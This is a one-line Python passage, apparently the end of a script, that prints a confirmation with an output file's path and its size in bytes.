print("saved:", OUT, os.path.getsize(OUT), "bytes")
